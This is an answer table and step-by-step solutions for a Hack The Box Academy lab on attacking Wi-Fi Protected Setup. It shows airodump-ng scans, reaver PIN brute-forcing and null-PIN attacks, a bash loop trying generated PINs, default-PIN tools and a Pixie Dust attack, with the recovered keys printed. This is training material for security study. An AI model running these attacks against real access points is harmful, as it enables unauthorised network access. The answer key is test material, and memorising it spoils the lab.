
| Section                                             | Question Number | Answer                  |
| --------------------------------------------------- | --------------- | ----------------------- |
| WPS Reconnaissance                                  | Question 1      | 3                       |
| WPS Reconnaissance                                  | Question 2      | CyberNetSecure          |
| Online PIN Brute-Forcing Using Reaver               | Question 1      | WhatisRealANdNot        |
| Online PIN Brute-Forcing Using Reaver               | Question 2      | NullPINS                |
| Online PIN Brute-Forcing Using Reaver               | Question 3      | 0575                    |
| Secured Access Points                               | Question 1      | 3                       |
| Secured Access Points                               | Question 2      | 11115670                |
| Using Multiple Pre-defined PINs                     | Question 1      | 99956042                |
| Using Multiple Pre-defined PINs                     | Question 2      | Wistron Corporation     |
| Using PIN Generation Tools                          | Question 1      | 93007801                |
| The Pixie Dust Attack                               | Question 1      | HackTheWifi             |
| The Pixie Dust Attack                               | Question 2      | 32452370                |
| Push Button Configuration                           | Question 1      | HTB{CONNECT\_WITH\_PBC} |
| Attacking Wi-Fi Protected Setup - Skills Assessment | Question 1      | 98990987                |
| Attacking Wi-Fi Protected Setup - Skills Assessment | Question 2      | 31080279                |

## Acronyms Used in Writeups

| Acronym | Meaning |
| --- | --- |
| STMIP | Spawned Target Machine IP Address |
| STMPO | Spawned Target Machine Port |
| PMVPN | Personal Machine with a Connection to the Academy's VPN |
| PWNIP | Pwnbox IP Address (or PMVPN IP Address) |
| PWNPO | Pwnbox Port (or PMVPN Port) |

# WPS Reconnaissance

## Question 1

### "How many WIFI networks with WPS are available? (Answer in digit format: e.g., 5)"

After spawning the target, students will establish an RDP session using the credentials `wifi:wifi`:

Code: shell

```shell
xfreerdp /v:STMIP /u:wifi /p:wifi /dynamic-resolution
```

```
┌─[eu-academy-5]─[10.10.14.100]─[htb-ac-8414@htb-ihp50puvhf]─[~]
└──╼ [★]$ xfreerdp /v:10.129.98.213 /u:wifi /p:wifi /dynamic-resolution 

[01:21:13:853] [10474:10475] [ERROR][com.winpr.timezone] - Unable to find a match for unix timezone: US/Central
[01:21:13:154] [10474:10475] [INFO][com.freerdp.gdi] - Local framebuffer format  PIXEL_FORMAT_BGRX32
[01:21:13:154] [10474:10475] [INFO][com.freerdp.gdi] - Remote framebuffer format PIXEL_FORMAT_BGRA32
[01:21:13:167] [10474:10475] [INFO][com.freerdp.channels.rdpsnd.client] - [static] Loaded fake backend for rdpsnd
[01:21:13:167] [10474:10475] [INFO][com.freerdp.channels.drdynvc.client] - Loading Dynamic Virtual Channel rdpgfx
[01:21:13:167] [10474:10475] [INFO][com.freerdp.channels.drdynvc.client] - Loading Dynamic Virtual Channel disp
```

Students will open a terminal and switch to the `root` user:

Code: shell

```shell
sudo -s
```

```
wifi@WiFiIntro:~$ sudo -s
```

Next, students will list the available adapters, finding the `wlan0` network adapter that is running in `Managed` mode and are going to use `airmon-ng` to enable the `Monitor` mode on the `wlan0` adapter:

Code: shell

```shell
iwconfig
airmon-ng start wlan0
```

```
root@WiFiIntro:/home/wifi# iwconfig

wlan0     IEEE 802.11  ESSID:off/any  
          Mode:Managed  Access Point: Not-Associated   Tx-Power=20 dBm   
          Retry short limit:7   RTS thr:off   Fragment thr:off
          Encryption key:off
          Power Management:on
          
eth0      no wireless extensions.

lo        no wireless extensions.

root@WiFiIntro:/home/wifi# airmon-ng start wlan0

Found 4 processes that could cause trouble.
Kill them using 'airmon-ng check kill' before putting
the card in monitor mode, they will interfere by changing channels
and sometimes putting the interface back in managed mode

    PID Name
    184 avahi-daemon
    202 wpa_supplicant
    210 avahi-daemon
    221 NetworkManager

PHY	Interface	Driver		Chipset

phy2	wlan0		htb80211_chipset	HTB ChipSet of 802.11 radio(s) for mac80211

		(mac80211 monitor mode vif enabled for [phy2]wlan0 on [phy2]wlan0mon)
		(mac80211 station mode vif disabled for [phy2]wlan0)
```

Subsequently, students will `airodump-ng` to scan any available wireless networks in the environment by specifying the `--wps` option to display only networks with WPS enabled, also using `--ignore-negative-one` to filter out PWR error messages to attain the number of networks in the environment:

Code: shell

```shell
airodump-ng --wps --ignore-negative-one wlan0mon
```

```
root@WiFiIntro:/home/wifi# airodump-ng --wps --ignore-negative-one wlan0mon

 CH  4 ][ Elapsed: 36 s ][ 2024-11-04 07:23 

 BSSID              PWR  Beacons    #Data, #/s  CH   MB   ENC CIPHER  AUTH WPS    ESSID

 <SNIP>                    
 46:D4:99:F2:30:20  -28       30        0    0   1   54   WPA2 CCMP   PSK  2.0    Corp-VPN 
 EE:7B:99:9B:1C:19  -28       30        0    0   1   54   WPA2 CCMP   PSK  2.0    HackTheWifi                          

 BSSID              STATION            PWR   Rate    Lost    Frames  Notes  Probes
```

Answer: `3`

# WPS Reconnaissance

## Question 2

### "What is the name of the WIFI network with the BSSID D8:D7:3D:EB:29:D5?"

Students will reuse the previously established RDP session. Subsequently, they will use `airodump-ng` to filter out networks whose MAC address corresponds to `D8:D7:3D:EB:29:D5` on channel 1, finding out the name of the wireless network in the ESSID column:

Code: shell

```shell
airodump-ng --wps --ignore-negative-one -c 1 --bssid D8:D7:3D:EB:29:D5 wlan0mon
```

```
root@WiFiIntro:/home/wifi# airodump-ng --wps --ignore-negative-one -c 1 --bssid D8:D7:3D:EB:29:D5 wlan0mon

CH  1 ][ Elapsed: 6 s ][ 2024-11-04 07:23 

 BSSID              PWR RXQ  Beacons    #Data, #/s  CH   MB   ENC CIPHER  AUTH WPS    ESSID

 D8:D7:3D:EB:29:D5  -28 100       66        0    0   1   54   WPA2 CCMP   PSK  2.0    {hidden}                   

 BSSID              STATION            PWR   Rate    Lost    Frames  Notes  Probes
```

Answer: `CyberNetSecure`

# Online PIN Brute-Forcing Using Reaver

## Question 1

### "What is the WPA PSK for the WIFI Network named HackTheWifi?"

After spawning the target, students will establish an RDP session using the credentials `wifi:wifi`:

Code: shell

```shell
xfreerdp /v:STMIP /u:wifi /p:wifi /dynamic-resolution
```

```
┌─[eu-academy-5]─[10.10.14.100]─[htb-ac-8414@htb-ihp50puvhf]─[~]
└──╼ [★]$ xfreerdp /v:10.129.135.144 /u:wifi /p:wifi /dynamic-resolution 

[01:45:57:500] [48809:48810] [ERROR][com.winpr.timezone] - Unable to find a match for unix timezone: US/Central
[01:45:59:603] [48809:48810] [INFO][com.freerdp.gdi] - Local framebuffer format  PIXEL_FORMAT_BGRX32
[01:45:59:603] [48809:48810] [INFO][com.freerdp.gdi] - Remote framebuffer format PIXEL_FORMAT_BGRA32
[01:45:59:612] [48809:48810] [INFO][com.freerdp.channels.rdpsnd.client] - [static] Loaded fake backend for rdpsnd
[01:45:59:612] [48809:48810] [INFO][com.freerdp.channels.drdynvc.client] - Loading Dynamic Virtual Channel rdpgfx
[01:45:59:612] [48809:48810] [INFO][com.freerdp.channels.drdynvc.client] - Loading Dynamic Virtual Channel disp
```

Students will open a terminal and switch to the `root` user:

Code: shell

```shell
sudo -s
```

```
wifi@WiFiIntro:~$ sudo -s
```

Next, students will proceed to create a new interface named `mon0` and enable `Monitor` mode:

Code: shell

```shell
iw dev wlan0 interface add mon0 type monitor
ifconfig mon0 up
```

```
root@WiFiIntro:/home/wifi# iw dev wlan0 interface add mon0 type monitor
root@WiFiIntro:/home/wifi# ifconfig mon0 up
```

Subsequently, students will use `airodump-ng` to scan the available wireless networks in the environment using the `mon0` interface, specifically searching for enabled WPS networks to obtain the MAC address of the `HackTheWifi` network:

Code: shell

```shell
airodump-ng mon0 --wps
```

```
root@WiFiIntro:/home/wifi# airodump-ng mon0 --wps

CH 11 ][ Elapsed: 6 s ][ 2024-11-04 07:52 

 BSSID              PWR  Beacons    #Data, #/s  CH   MB   ENC CIPHER  AUTH WPS    ESSID

 D8:D7:3D:EB:29:D5  -28       64        0    0   1   54   WPA2 CCMP   PSK  2.0    CyberNetSecure                                         
 22:FB:96:FA:D5:D6  -28       64        0    0   1   54   WPA2 CCMP   PSK  2.0    Corp-VPN                                               
 72:54:37:49:34:D3  -28       64        0    0   1   54   WPA2 CCMP   PSK  2.0    HackTheWifi  
```

Students will proceed with `reaver` to obtain the WPS pre-shared key targeting the `HackTheWifi` network with the `72:54:37:49:34:D3` MAC address on channel 1:

Code: shell

```shell
reaver -i mon0 -b 72:54:37:49:34:D3 -c 1
```

```
root@WiFiIntro:/home/wifi# reaver -i mon0 -b 72:54:37:49:34:D3 -c 1

Reaver v1.6.5 WiFi Protected Setup Attack Tool
Copyright (c) 2011, Tactical Network Solutions, Craig Heffner <cheffner@tacnetsol.com>

[+] Waiting for beacon from 72:54:37:49:34:D3
[+] Received beacon from 72:54:37:49:34:D3
[!] Found packet with bad FCS, skipping...
[+] Associated with 72:54:37:49:34:D3 (ESSID: HackTheWifi)
[+] Associated with 72:54:37:49:34:D3 (ESSID: HackTheWifi)
[+] Associated with 72:54:37:49:34:D3 (ESSID: HackTheWifi)
[+] WPS PIN: '01235678'
[+] WPA PSK: '{hidden}'
[+] AP SSID: 'HackTheWifi'
```

Answer: `WhatisRealANdNot`

# Online PIN Brute-Forcing Using Reaver

## Question 2

### "What is the WPA PSK for the WIFI Network named Corp-VPN?"

Students will reuse the previously established RDP session. Additionally, students will refer to the output of the previous wireless network scan using `airodump-ng` to obtain the MAC address (`22:FB:96:FA:D5:D6`) of the `Corp-VPN` network:

```
root@WiFiIntro:/home/wifi# airodump-ng mon0 --wps

CH 11 ][ Elapsed: 6 s ][ 2024-11-04 07:52 

 BSSID              PWR  Beacons    #Data, #/s  CH   MB   ENC CIPHER  AUTH WPS    ESSID

 D8:D7:3D:EB:29:D5  -28       64        0    0   1   54   WPA2 CCMP   PSK  2.0    CyberNetSecure                                         
 22:FB:96:FA:D5:D6  -28       64        0    0   1   54   WPA2 CCMP   PSK  2.0    Corp-VPN                                               
 72:54:37:49:34:D3  -28       64        0    0   1   54   WPA2 CCMP   PSK  2.0    HackTheWifi  
```

Subsequently, students will use `reaver` and are going to perform a `Null PIN` attack to obtain the pre-shared key:

Code: shell

```shell
reaver -i mon0 -b 22:FB:96:FA:D5:D6 -c 1 -p " "
```

```
root@WiFiIntro:/home/wifi# reaver -i mon0 -b 22:FB:96:FA:D5:D6 -c 1 -p " "

Reaver v1.6.5 WiFi Protected Setup Attack Tool
Copyright (c) 2011, Tactical Network Solutions, Craig Heffner <cheffner@tacnetsol.com>

[+] Waiting for beacon from 22:FB:96:FA:D5:D6
[+] Received beacon from 22:FB:96:FA:D5:D6
[!] Found packet with bad FCS, skipping...
[+] Associated with 22:FB:96:FA:D5:D6 (ESSID: Corp-VPN)
[+] WPS PIN: ' '
[+] WPA PSK: '{hidden}'
[+] AP SSID: 'Corp-VPN'
```

Answer: `NullPINS`

# Online PIN Brute-Forcing Using Reaver

## Question 3

### "The first 4 digits of the WPS PIN for the WiFi network named CyberNetSecure are 8487. What are the remaining 4 digits?"

Students will reuse the previously established RDP session. Additionally, students will refer to the output of the previous wireless network scan using `airodump-ng` to obtain the MAC address (`D8:D7:3D:EB:29:D5`) of the `CyberNetSecure` network:

```
root@WiFiIntro:/home/wifi# airodump-ng mon0 --wps

CH 11 ][ Elapsed: 6 s ][ 2024-11-04 07:52 

 BSSID              PWR  Beacons    #Data, #/s  CH   MB   ENC CIPHER  AUTH WPS    ESSID

 D8:D7:3D:EB:29:D5  -28       64        0    0   1   54   WPA2 CCMP   PSK  2.0    CyberNetSecure                                         
 22:FB:96:FA:D5:D6  -28       64        0    0   1   54   WPA2 CCMP   PSK  2.0    Corp-VPN                                               
 72:54:37:49:34:D3  -28       64        0    0   1   54   WPA2 CCMP   PSK  2.0    HackTheWifi  
```

Subsequently, students will use `reaver` to retrieve the final four digits of the PIN of the `CyberNetSecure` wireless network using the known PIN of `8487`:

Code: shell

```shell
reaver -i mon0 -b D8:D7:3D:EB:29:D5 -p 8487
```

```
root@WiFiIntro:/home/wifi# reaver -i mon0 -b D8:D7:3D:EB:29:D5 -p 8487

Reaver v1.6.5 WiFi Protected Setup Attack Tool
Copyright (c) 2011, Tactical Network Solutions, Craig Heffner <cheffner@tacnetsol.com>

[+] Waiting for beacon from D8:D7:3D:EB:29:D5
[+] Received beacon from D8:D7:3D:EB:29:D5
[!] Found packet with bad FCS, skipping...

<SNIP>

[+] 91.46% complete @ 2024-11-04 08:32:25 (1 seconds/pin)
[+] Associated with D8:D7:3D:EB:29:D5 (ESSID: CyberNetSecure)
[+] Associated with D8:D7:3D:EB:29:D5 (ESSID: CyberNetSecure)
[+] Associated with D8:D7:3D:EB:29:D5 (ESSID: CyberNetSecure)
[+] Associated with D8:D7:3D:EB:29:D5 (ESSID: CyberNetSecure)
[+] Associated with D8:D7:3D:EB:29:D5 (ESSID: CyberNetSecure)
[+] 91.51% complete @ 2024-11-04 08:32:33 (1 seconds/pin)
[+] Associated with D8:D7:3D:EB:29:D5 (ESSID: CyberNetSecure)
[+] WPS PIN: '8487{hidden}'
[+] WPA PSK: 'EveryTh!nGisF@k3'
[+] AP SSID: 'CyberNetSecure'
```

Answer: `0575`

# Secured Access Points

## Question 1

### "Perform a brute-force attack on the WiFi network named HackTheBox\_Secure. After how many attempts does the AP get locked? (Answer in digit format: e.g., 5)"

After spawning the target, students will establish an RDP session using the credentials `wifi:wifi`:

Code: shell

```shell
xfreerdp /v:STMIP /u:wifi /p:wifi /dynamic-resolution
```

```
┌─[eu-academy-5]─[10.10.14.100]─[htb-ac-8414@htb-dfrn3bowps]─[~]
└──╼ [★]$ xfreerdp /v:10.129.83.125 /u:wifi /p:wifi /dynamic-resolution 

[02:55:38:728] [13231:13232] [ERROR][com.winpr.timezone] - Unable to find a match for unix timezone: US/Central
[02:55:39:029] [13231:13232] [INFO][com.freerdp.gdi] - Local framebuffer format  PIXEL_FORMAT_BGRX32
[02:55:39:029] [13231:13232] [INFO][com.freerdp.gdi] - Remote framebuffer format PIXEL_FORMAT_BGRA32
[02:55:39:044] [13231:13232] [INFO][com.freerdp.channels.rdpsnd.client] - [static] Loaded fake backend for rdpsnd
[02:55:39:044] [13231:13232] [INFO][com.freerdp.channels.drdynvc.client] - Loading Dynamic Virtual Channel rdpgfx
[02:55:39:044] [13231:13232] [INFO][com.freerdp.channels.drdynvc.client] - Loading Dynamic Virtual Channel disp
```

Next, students will proceed to create a new interface named `mon0` and enable `Monitor` mode:

Code: shell

```shell
iw dev wlan0 interface add mon0 type monitor
ifconfig mon0 up
```

```
root@WiFiIntro:/home/wifi# iw dev wlan0 interface add mon0 type monitor
root@WiFiIntro:/home/wifi# ifconfig mon0 up
```

Subsequently, students will use `airodump-ng` to scan the available wireless networks in the environment using the `mon0` interface, specifically searching for enabled WPS networks to obtain the MAC address of the `HackTheBox_Secure` network. Note, the MAC address changes upon every spawn of the target:

Code: shell

```shell
airodump-ng mon0 --wps
```

```
root@WiFiIntro:/home/wifi# airodump-ng mon0 --wps

 CH  1 ][ Elapsed: 6 s ][ 2024-11-04 09:00 ][ fixed channel mon0: -1 

 BSSID              PWR RXQ  Beacons    #Data, #/s  CH   MB   ENC CIPHER  AUTH WPS    ESSID

 16:CF:63:BA:5D:45  -28 100       93        0    0   1   54   WPA2 CCMP   PSK  2.0    HackTheBox_Secure                             

 BSSID              STATION            PWR   Rate    Lost    Frames  Notes  Probes
```

Next, students will use `reaver` to perform brute-forcing while enabling verbosity to find out the number of attempts needed for the wireless access point to become locked; they will scrutinize the warning message and will count the number of attempts:

Code: shell

```shell
reaver -i mon0 -c 1 -b 16:CF:63:BA:5D:45 -v
```

```
root@WiFiIntro:/home/wifi# reaver -i mon0 -c 1 -b 16:CF:63:BA:5D:45 -v

Reaver v1.6.5 WiFi Protected Setup Attack Tool
Copyright (c) 2011, Tactical Network Solutions, Craig Heffner <cheffner@tacnetsol.com>

[+] Waiting for beacon from 16:CF:63:BA:5D:45
[+] Received beacon from 16:CF:63:BA:5D:45
[+] Trying pin "12345670"
[!] Found packet with bad FCS, skipping...
[+] Associated with 16:CF:63:BA:5D:45 (ESSID: HackTheBox_Secure)

<SNIP>

[+] Trying pin "01235678"
[+] Associated with 16:CF:63:BA:5D:45 (ESSID: HackTheBox_Secure)
[!] WARNING: Detected AP rate limiting, waiting 60 seconds before re-checking
```

Answer: `3`

# Secured Access Points

## Question 2

### "Perform a brute-force attack on the WiFi network named HackTheBox\_Secure. What is the WPS PIN?"

Students will reuse the previously established RDP session and will use `airodump-ng` to verify that the access point `HackTheBox_Secure` is not locked:

Code: shell

```shell
airodump-ng mon0 --wps
```

```
root@WiFiIntro:/home/wifi# airodump-ng mon0 --wps

 CH  1 ][ Elapsed: 6 s ][ 2024-11-04 09:05 

 BSSID              PWR  Beacons    #Data, #/s  CH   MB   ENC CIPHER  AUTH WPS    ESSID

 16:CF:63:BA:5D:45  -28      104        0    0   1   54   WPA2 CCMP   PSK  2.0    HackTheBox_Secure                                 

 BSSID              STATION            PWR   Rate    Lost    Frames  Notes  Probes
```

Next, students will use again `reaver` to brute-force the WPS pin of the `HackTheBox_Secure` wireless network:

Code: shell

```shell
reaver -i mon0 -c 1 -b 16:CF:63:BA:5D:45 -v
```

```
root@WiFiIntro:/home/wifi# reaver -i mon0 -c 1 -b 16:CF:63:BA:5D:45 -v

Reaver v1.6.5 WiFi Protected Setup Attack Tool
Copyright (c) 2011, Tactical Network Solutions, Craig Heffner <cheffner@tacnetsol.com>

[+] Waiting for beacon from 16:CF:63:BA:5D:45
[+] Received beacon from 16:CF:63:BA:5D:45
[+] Trying pin "12345670"
[!] Found packet with bad FCS, skipping...
[+] Associated with 16:CF:63:BA:5D:45 (ESSID: HackTheBox_Secure)
[+] Trying pin "00005678"
[+] Associated with 16:CF:63:BA:5D:45 (ESSID: HackTheBox_Secure)
[+] Trying pin "01235678"
[+] Associated with 16:CF:63:BA:5D:45 (ESSID: HackTheBox_Secure)
[!] WARNING: Detected AP rate limiting, waiting 60 seconds before re-checking
[+] Trying pin "11115670"
[+] Associated with 16:CF:63:BA:5D:45 (ESSID: HackTheBox_Secure)
[+] WPS PIN: '{hidden}'
[+] WPA PSK: 'L0cK!nG_Th3_AP'
[+] AP SSID: 'HackTheBox_Secure'
```

Answer: `11115670`

# Using Multiple Pre-defined PINs

## Question 1

### "What is the WPS PIN for the WIFI Network named CyberNetSecure?"

After spawning the target, students will establish an RDP session using the credentials `wifi:wifi`:

Code: shell

```shell
xfreerdp /v:STMIP /u:wifi /p:wifi /dynamic-resolution
```

```
┌─[eu-academy-5]─[10.10.14.100]─[htb-ac-8414@htb-q6pdxcclwf]─[~]
└──╼ [★]$ xfreerdp /v:10.129.230.173 /u:wifi /p:wifi /dynamic-resolution 

[05:22:45:893] [49754:49755] [ERROR][com.winpr.timezone] - Unable to find a match for unix timezone: US/Central
[05:22:45:194] [49754:49755] [INFO][com.freerdp.gdi] - Local framebuffer format  PIXEL_FORMAT_BGRX32
[05:22:45:194] [49754:49755] [INFO][com.freerdp.gdi] - Remote framebuffer format PIXEL_FORMAT_BGRA32
[05:22:45:206] [49754:49755] [INFO][com.freerdp.channels.rdpsnd.client] - [static] Loaded fake backend for rdpsnd
[05:22:45:206] [49754:49755] [INFO][com.freerdp.channels.drdynvc.client] - Loading Dynamic Virtual Channel rdpgfx
[05:22:45:206] [49754:49755] [INFO][com.freerdp.channels.drdynvc.client] - Loading Dynamic Virtual Channel disp
```

Next, students will open a terminal and switch to the `root` user:

Code: shell

```shell
sudo -s
```

```
wifi@WiFiIntro:~$ sudo -s
```

Next, students will proceed to create a new interface named `mon0` and enable `Monitor` mode:

Code: shell

```shell
iw dev wlan0 interface add mon0 type monitor
ifconfig mon0 up
```

```
root@WiFiIntro:/home/wifi# iw dev wlan0 interface add mon0 type monitor
root@WiFiIntro:/home/wifi# ifconfig mon0 up
```

Subsequently, students will use `airodump-ng` to scan the environment and obtain the MAC address of the `CyberNetSecure` network:

Code: shell

```shell
airodump-ng mon0 --wps
```

```
root@WiFiIntro:/home/wifi# airodump-ng mon0 --wps

 CH 11 ][ Elapsed: 0 s ][ 2024-11-04 11:27 

 BSSID              PWR  Beacons    #Data, #/s  CH   MB   ENC CIPHER  AUTH WPS    ESSID

 60:38:E0:12:4F:A2  -28        3        0    0   1   54   WPA2 CCMP   PSK  2.0    HackTheWifi                                                 
 EE:57:22:A8:C0:F7  -28        3        0    0   1   54   WPA2 CCMP   PSK  2.0    HTB-Wireless                                                
 D8:D7:3D:EB:29:D5  -28        3        0    0   1   54   WPA2 CCMP   PSK  2.0    CyberNetSecure 
```

With the attained MAC address of the network, students will use `wpspin` to generate potential PINs:

Code: shell

```shell
wpspin -A D8:D7:3D:EB:29:D5 | grep -Eo '\b[0-9]{8}\b' | tr '\n' ' '
```

```
root@WiFiIntro:/home/wifi# wpspin -A D8:D7:3D:EB:29:D5 | grep -Eo '\b[0-9]{8}\b' | tr '\n' ' ' 

54116696 35154778 88218458 35929178 67904853 98126934 83901010 24855044 92858114 51432669 16664913 13655464 08233387 62350075 96225462 55764247 34075920 12345670 20172527 46264848 76229909 62327145 10864111 31957199 30432031 71412252 68175542 95661469 95719115 48563710 20854836 43977680 05294176 99956042 35611530 67958146 34259283 94229882 95755212
```

Students will use the provided bash script in the section altering the `PINS` variable based on the previously generated PINs and adjusting the MAC address obtained earlier:

Code: shell

```shell
cat << EOF > pinguess.sh
#!/bin/bash

PINS='54116696 35154778 88218458 35929178 67904853 98126934 83901010 24855044 92858114 51432669 16664913 13655464 08233387 62350075 96225462 55764247 34075920 12345670 20172527 46264848 76229909 62327145 10864111 31957199 30432031 71412252 68175542 95661469 95719115 48563710 20854836 43977680 05294176 99956042 35611530 67958146 34259283 94229882 95755212'

for PIN in \$PINS
do
   if sudo reaver --max-attempts=1 -l 100 -r 3:45 -i mon0 -b D8:D7:3D:EB:29:D5 -c 1 -p \$PIN > /dev/null 2>&1; then
	    echo "[+] WPS PIN Found: \$PIN"
	    break
   fi	
done
echo "PIN Guesses Complete"
EOF
```

```
root@WiFiIntro:/home/wifi# cat << EOF > pinguess.sh
#!/bin/bash

PINS='54116696 35154778 88218458 35929178 67904853 98126934 83901010 24855044 92858114 51432669 16664913 13655464 08233387 62350075 96225462 55764247 34075920 12345670 20172527 46264848 76229909 62327145 10864111 31957199 30432031 71412252 68175542 95661469 95719115 48563710 20854836 43977680 05294176 99956042 35611530 67958146 34259283 94229882 95755212'

for PIN in \$PINS
do
   if sudo reaver --max-attempts=1 -l 100 -r 3:45 -i mon0 -b D8:D7:3D:EB:29:D5 -c 1 -p \$PIN > /dev/null 2>&1; then
            echo "[+] WPS PIN Found: \$PIN"
            break
   fi   
done
echo "PIN Guesses Complete"
EOF
```

Next, students will run the bash script to obtain the PIN of the `CyberNetSecure` network:

Code: shell

```shell
bash pinguess.sh
```

```
root@WiFiIntro:/home/wifi# bash pinguess.sh 

[+] WPS PIN Found: {hidden}
PIN Guesses Complete
```

Answer: `99956042`

# Using Multiple Pre-defined PINs

## Question 2

### "Perform a vendor lookup for the BSSID F8:CE:72:3A:D2:A1. What is the vendor’s name?"

Students will reuse the previously established RDP session and are going to scrutinize the `out.txt` located in the `/var/lib/ieee-data` directory to perform a vendor lookup by using the first portion of the `F8:CE:72:3A:D2:A1` MAC address:

Code: shell

```shell
grep -i "F8-CE-72" /var/lib/ieee-data/oui.txt
```

```
root@WiFiIntro:/home/wifi# grep -i "F8-CE-72" /var/lib/ieee-data/oui.txt

F8-CE-72   (hex)		{hidden}
```

Answer: `Wistron Corporation`

# Using PIN Generation Tools

## Question 1

### "What is the WPS PIN for the WIFI Network named HackTheWifi?"

After spawning the target, students will establish an RDP session using the credentials `wifi:wifi`:

Code: shell

```shell
xfreerdp /v:STMIP /u:wifi /p:wifi /dynamic-resolution
```

```
┌─[eu-academy-5]─[10.10.14.100]─[htb-ac-8414@htb-xcpridbtoe]─[~]
└──╼ [★]$ xfreerdp /v:10.129.230.173 /u:wifi /p:wifi /dynamic-resolution 

[06:25:44:826] [6077:6078] [ERROR][com.winpr.timezone] - Unable to find a match for unix timezone: US/Central
[06:25:44:127] [6077:6078] [INFO][com.freerdp.gdi] - Local framebuffer format  PIXEL_FORMAT_BGRX32
[06:25:44:127] [6077:6078] [INFO][com.freerdp.gdi] - Remote framebuffer format PIXEL_FORMAT_BGRA32
[06:25:44:143] [6077:6078] [INFO][com.freerdp.channels.rdpsnd.client] - [static] Loaded fake backend for rdpsnd
[06:25:44:143] [6077:6078] [INFO][com.freerdp.channels.drdynvc.client] - Loading Dynamic Virtual Channel rdpgfx
[06:25:44:143] [6077:6078] [INFO][com.freerdp.channels.drdynvc.client] - Loading Dynamic Virtual Channel disp
```

Next, students will open a terminal and switch to the `root` user:

Code: shell

```shell
sudo -s
```

```
wifi@WiFiIntro:~$ sudo -s
```

Next, students will proceed to create a new interface named `mon0` and enable `Monitor` mode:

Code: shell

```shell
iw dev wlan0 interface add mon0 type monitor
ifconfig mon0 up
```

```
root@WiFiIntro:/home/wifi# iw dev wlan0 interface add mon0 type monitor
root@WiFiIntro:/home/wifi# ifconfig mon0 up
```

Subsequently, students will use `airodump-ng` to scan the environment and obtain the MAC address of the `HackTheWifi` network:

Code: shell

```shell
airodump-ng mon0 --wps
```

```
root@WiFiIntro:/home/wifi# airodump-ng mon0 --wps

 CH 10 ][ Elapsed: 0 s ][ 2024-11-04 12:27 

 BSSID              PWR  Beacons    #Data, #/s  CH   MB   ENC CIPHER  AUTH WPS    ESSID

 D8:D7:3D:EB:29:D5  -28       23        0    0   1   54   WPA2 CCMP   PSK  2.0    CyberNetSecure                                                 
 60:38:E0:12:4F:A2  -28       23        0    0   1   54   WPA2 CCMP   PSK  2.0    HackTheWifi                                                    
 3E:A5:ED:8A:1C:74  -28       23        0    0   1   54   WPA2 CCMP   PSK  2.0    HTB-Wireless  
```

Students will use `default-wps-pin.py` located in the `/opt/Default-wps-pin` directory with the MAC address of the `HackTheWifi` network to obtain the WPS pin:

Code: shell

```shell
python2 /opt/Default-wps-pin/default-wps-pin.py 60:38:E0:12:4F:A2
```

```
root@WiFiIntro:/home/wifi# python2 /opt/Default-wps-pin/default-wps-pin.py 60:38:E0:12:4F:A2

derived serial number: R----20386
SSID: Arcor|EasyBox|Vodafone-124F26
WPS pin: {hidden}
```

Answer: `93007801`

# The Pixie Dust Attack

## Question 1

### "Scan for the available WIFI Networks. What is the name of the available WIFI network?"

After spawning the target, students will establish an RDP session using the credentials `wifi:wifi`:

Code: shell

```shell
xfreerdp /v:STMIP /u:wifi /p:wifi /dynamic-resolution
```

```
┌─[eu-academy-5]─[10.10.14.100]─[htb-ac-8414@htb-xcpridbtoe]─[~]
└──╼ [★]$ xfreerdp /v:10.129.230.175 /u:wifi /p:wifi /dynamic-resolution 

[06:43:32:456] [33802:33803] [ERROR][com.winpr.timezone] - Unable to find a match for unix timezone: US/Central
[06:43:32:756] [33802:33803] [INFO][com.freerdp.gdi] - Local framebuffer format  PIXEL_FORMAT_BGRX32
[06:43:32:756] [33802:33803] [INFO][com.freerdp.gdi] - Remote framebuffer format PIXEL_FORMAT_BGRA32
[06:43:32:773] [33802:33803] [INFO][com.freerdp.channels.rdpsnd.client] - [static] Loaded fake backend for rdpsnd
[06:43:32:773] [33802:33803] [INFO][com.freerdp.channels.drdynvc.client] - Loading Dynamic Virtual Channel rdpgfx
[06:43:32:773] [33802:33803] [INFO][com.freerdp.channels.drdynvc.client] - Loading Dynamic Virtual Channel disp
```

Next, students will open a terminal and switch to the `root` user:

Code: shell

```shell
sudo -s
```

```
wifi@WiFiIntro:~$ sudo -s
```

Students will proceed to create a new interface named `mon0` and enable `Monitor` mode:

Code: shell

```shell
iw dev wlan0 interface add mon0 type monitor
ifconfig mon0 up
```

```
root@WiFiIntro:/home/wifi# iw dev wlan0 interface add mon0 type monitor
root@WiFiIntro:/home/wifi# ifconfig mon0 up
```

Subsequently, students will use `airodump-ng` to scan the environment to find a wireless network:

Code: shell

```shell
airodump-ng mon0 --wps
```

```
root@WiFiIntro:/home/wifi# ifconfig mon0 up

 CH 14 ][ Elapsed: 12 s ][ 2024-11-04 12:46 

 BSSID              PWR  Beacons    #Data, #/s  CH   MB   ENC CIPHER  AUTH WPS                ESSID

 C2:56:02:94:8F:3E  -28       99        0    0   1   54   WPA2 CCMP   PSK  2.0 LAB,DISP,KPAD  {hidden}                  

 BSSID              STATION            PWR   Rate    Lost    Frames  Notes  Probes

 (not associated)   02:00:00:00:01:00  -29    0 - 6      0       15 
```

Answer: `HackTheWifi`

# The Pixie Dust Attack

## Question 2

### "Perform the Pixie Dust attack on the WiFi network. What is the WPS PIN for this network?"

Students will reuse the previously established RDP session. They are going to use `reaver` to perform a pixie dust attack using the MAC address of the previously found network to obtain the WPS pin:

Code: shell

```shell
reaver -K 1 -vvv -b C2:56:02:94:8F:3E -c 1 -i mon0
```

```
root@WiFiIntro:/home/wifi# reaver -K 1 -vvv -b C2:56:02:94:8F:3E -c 1 -i mon0

Reaver v1.6.5 WiFi Protected Setup Attack Tool
Copyright (c) 2011, Tactical Network Solutions, Craig Heffner <cheffner@tacnetsol.com>

[+] Switching mon0 to channel 1
[+] Waiting for beacon from C2:56:02:94:8F:3E
[+] Received beacon from C2:56:02:94:8F:3E
WPS: A new PIN configured (timeout=0)
WPS: UUID - hexdump(len=16): [NULL]
WPS: PIN - hexdump_ascii(len=8):
     31 32 33 34 35 36 37 30                           12345670        
WPS: Selected registrar information changed
WPS: Internal Registrar selected (pbc=0)

<SNIP>

 Pixiewps 1.4

 [?] Mode:     1 (RT/MT/CL)
 [*] Seed N1:  0x10b303cb
 [*] Seed ES1: 0x00000000
 [*] Seed ES2: 0x00000000
 [*] PSK1:     fe2ee4379a7cf93db2c3f7101ea9781a
 [*] PSK2:     396d1d2c79d2288b1b5c3b24bf109c89
 [*] ES1:      00000000000000000000000000000000
 [*] ES2:      00000000000000000000000000000000
 [+] WPS pin:  {hidden}

 [*] Time taken: 0 s 15 ms
```

Answer: `32452370`

